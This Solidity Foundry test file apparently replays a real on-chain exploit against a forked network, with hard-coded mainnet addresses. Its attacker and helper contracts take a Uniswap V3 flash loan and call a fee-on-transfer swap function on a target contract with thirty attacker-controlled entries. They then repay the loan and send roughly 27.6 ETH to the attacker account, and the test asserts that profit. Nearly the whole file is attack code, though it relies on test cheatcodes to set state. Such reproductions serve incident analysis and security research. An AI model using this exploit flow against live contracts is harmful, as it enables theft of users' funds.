
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 41038633;
    uint256 constant TX_TIMESTAMP = 1768866615;
    uint256 constant TX_BLOCK_NUMBER = 41038634;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _installRuntime();
        OurAttack attack = OurAttack(payable(ATTACK_CONTRACT));
        _etchHelpers();
        attack.bindHelper(Addresses.attack_helper);
        _expectOutcome(address(attack), Addresses.attack_helper);
        _snapProfit();
        _logBalances("Before exploit");
        attack.executeSetup{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchHelpers() internal {
        vm.etch(Addresses.attack_helper, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper);
        _hydrateAttackHelper();
    }

    function _hydrateAttackHelper() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_helper,
                bytes32(uint256(0)),
                bytes32(uint256(22136933570767372485177007783623648164187438237))
            );
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attack_helper, helper, Addresses.SYP, "SYP", 442345096000000000000000);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 27639650363124921789);
    }
}

contract OurAttack {




    AttackerHelper public helper;

    constructor() payable {
        _ctorBootstrap();
    }

    function _ctorBootstrap() internal {
        helper = AttackerHelper(payable(Addresses.attack_helper));
    }

    function executeSetup() external payable {
        if (address(helper) == address(0)) _ctorBootstrap();
        _setup();
    }

    function _setup() public {
        {
            address created = Addresses.attack_helper;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper))._helper();
        Harness.vmExt()
            .store(Addresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(13823284250000000000)));
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        AttackerHelper(payable(Addresses.attack_helper)).helperCb2();
        AttackerHelper(payable(Addresses.attack_helper)).withdraw(Addresses.attacker_eoa);
    }

    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function bindHelper(address attackHelper) external {
        helper = AttackerHelper(payable(attackHelper));
    }

    function _boundAttack(bytes memory data) internal {
        _decodedCall(address(helper), data);
    }

    function _decodedCall(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        require(ok, "helper dispatch failed");
    }

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

contract AttackerHelper {
    receive() external payable {}

    function withdraw(address amount) external payable {
        amount;
        _helperCb();
        return;
    }

    function drainAll() external payable {
        _helperCb2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        amount0;
        amount1;
        data;
        flashCallback2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        _entryCb();
    }

    function helperCb() external payable {
        _helperCb();
        return;
    }

    function helperCb2() external payable {
        _helperCb2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashCallback() external payable {
        flashCallback2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _helperCb() internal {
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 27639653402053937499) nativeTransferAmount = 27639653402053937499;
            (bool ok,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
        IERC20Like(Addresses.WETH).balanceOf(Addresses.attack_helper);
    }

    function _helperCb2() internal {
        Harness.vmExt()
            .store(Addresses.attack_helper, bytes32(uint256(1)), bytes32(uint256(13823284250000000000)));
        IERC20Like(Addresses.WETH).balanceOf(Addresses.UniswapV3Pool);
        IUniswapV3Pool(Addresses.UniswapV3Pool).token0();
        Harness.vmExt().store(Addresses.attack_helper, bytes32(uint256(2)), bytes32(uint256(1)));
        {
            bytes memory flashProof = hex"";
            IUniswapV3Pool(Addresses.UniswapV3Pool)
                .flash(Addresses.attack_helper, 13830195892125000001, 0, flashProof);
        }
    }

    function flashCallback2() internal {
        _markCallback(2);
        uint256 wethBalanceOfAttackHelper = IERC20Like(Addresses.WETH).balanceOf(Addresses.attack_helper);
        IWETH(Addresses.WETH).withdraw(wethBalanceOfAttackHelper);
        {
            address[] memory abiArg0 = new address[](30);
            abiArg0[0] = Addresses.attack_helper;
            abiArg0[1] = Addresses.attack_helper;
            abiArg0[2] = Addresses.attack_helper;
            abiArg0[3] = Addresses.attack_helper;
            abiArg0[4] = Addresses.attack_helper;
            abiArg0[5] = Addresses.attack_helper;
            abiArg0[6] = Addresses.attack_helper;
            abiArg0[7] = Addresses.attack_helper;
            abiArg0[8] = Addresses.attack_helper;
            abiArg0[9] = Addresses.attack_helper;
            abiArg0[10] = Addresses.attack_helper;
            abiArg0[11] = Addresses.attack_helper;
            abiArg0[12] = Addresses.attack_helper;
            abiArg0[13] = Addresses.attack_helper;
            abiArg0[14] = Addresses.attack_helper;
            abiArg0[15] = Addresses.attack_helper;
            abiArg0[16] = Addresses.attack_helper;
            abiArg0[17] = Addresses.attack_helper;
            abiArg0[18] = Addresses.attack_helper;
            abiArg0[19] = Addresses.attack_helper;
            abiArg0[20] = Addresses.attack_helper;
            abiArg0[21] = Addresses.attack_helper;
            abiArg0[22] = Addresses.attack_helper;
            abiArg0[23] = Addresses.attack_helper;
            abiArg0[24] = Addresses.attack_helper;
            abiArg0[25] = Addresses.attack_helper;
            abiArg0[26] = Addresses.attack_helper;
            abiArg0[27] = Addresses.attack_helper;
            abiArg0[28] = Addresses.attack_helper;
            abiArg0[29] = Addresses.attack_helper;
            uint256[] memory abiArg1 = new uint256[](30);
            abiArg1[0] = 10;
            abiArg1[1] = 10;
            abiArg1[2] = 10;
            abiArg1[3] = 10;
            abiArg1[4] = 10;
            abiArg1[5] = 10;
            abiArg1[6] = 10;
            abiArg1[7] = 10;
            abiArg1[8] = 10;
            abiArg1[9] = 10;
            abiArg1[10] = 10;
            abiArg1[11] = 10;
            abiArg1[12] = 10;
            abiArg1[13] = 10;
            abiArg1[14] = 10;
            abiArg1[15] = 10;
            abiArg1[16] = 10;
            abiArg1[17] = 10;
            abiArg1[18] = 10;
            abiArg1[19] = 10;
            abiArg1[20] = 10;
            abiArg1[21] = 10;
            abiArg1[22] = 10;
            abiArg1[23] = 10;
            abiArg1[24] = 10;
            abiArg1[25] = 10;
            abiArg1[26] = 10;
            abiArg1[27] = 10;
            abiArg1[28] = 10;
            abiArg1[29] = 10;
            bool[] memory abiArg2 = new bool[](30);
            abiArg2[0] = true;
            abiArg2[1] = true;
            abiArg2[2] = true;
            abiArg2[3] = true;
            abiArg2[4] = true;
            abiArg2[5] = true;
            abiArg2[6] = true;
            abiArg2[7] = true;
            abiArg2[8] = true;
            abiArg2[9] = true;
            abiArg2[10] = true;
            abiArg2[11] = true;
            abiArg2[12] = true;
            abiArg2[13] = true;
            abiArg2[14] = true;
            abiArg2[15] = true;
            abiArg2[16] = true;
            abiArg2[17] = true;
            abiArg2[18] = true;
            abiArg2[19] = true;
            abiArg2[20] = true;
            abiArg2[21] = true;
            abiArg2[22] = true;
            abiArg2[23] = true;
            abiArg2[24] = true;
            abiArg2[25] = true;
            abiArg2[26] = true;
            abiArg2[27] = true;
            abiArg2[28] = true;
            abiArg2[29] = true;
            IContract_39F36E_1A32(Addresses.A_39F36E_1A32)
            .swapExactTokensForETHSupportingFeeOnTransferTokens{value: 13823284250000000000}(
                abiArg0, abiArg1, abiArg2
            );
        }
        {
            uint256 depositAmount = address(this).balance;
            if (depositAmount > 13837110990071062502) depositAmount = 13837110990071062502;
            if (depositAmount != 0) IWETH(Addresses.WETH).deposit{value: depositAmount}();
        }
        {
            Harness.vmExt().startPrank(Addresses.attack_helper);
            IERC20Like(Addresses.WETH).transfer(Addresses.UniswapV3Pool, 13837110990071062502);

            Harness.vmExt().stopPrank();
        }
    }

    function _attack() internal {
        _markCallback(3);
    }

    function _helper() public {}
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attack_contract = 0x03E0A788e47531aa86b0fd2c44219Dc465737c9d;
    address internal constant SYP = 0x2BdD3602Fc526AA5CC677Cd708375dD2F7C4256F;
    address internal constant FiatTokenV2_2 = 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779;
    address internal constant attack_helper = 0x3821f686384c231e2F71ea093Fb6189dE803f482;
    address internal constant A_39F36E_1A32 = 0x39F36e2E58f36F7E5c17784847fd07Da1fEE1a32;
    address internal constant attacker_eoa = 0x3Aa8bb3A19EECD229Cb33fbc03Ff549473e30F38;
    address internal constant WETH = 0x4200000000000000000000000000000000000006;
    address internal constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant A_C859AC_B371 = 0xC859aC8429fB4a5E24F24A7BeD3fE3a8Db4fb371;
    address internal constant UniswapV3Pool = 0xd0b53D9277642d899DF5C87A3966A349A798F224;
}

interface IContract_39F36E_1A32 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(address[] calldata, uint256[] calldata, bool[] calldata)
        external
        payable;
}

interface IUniswapV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface Iattack_helper {
    function drainAll() external;
    function withdraw(address) external;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
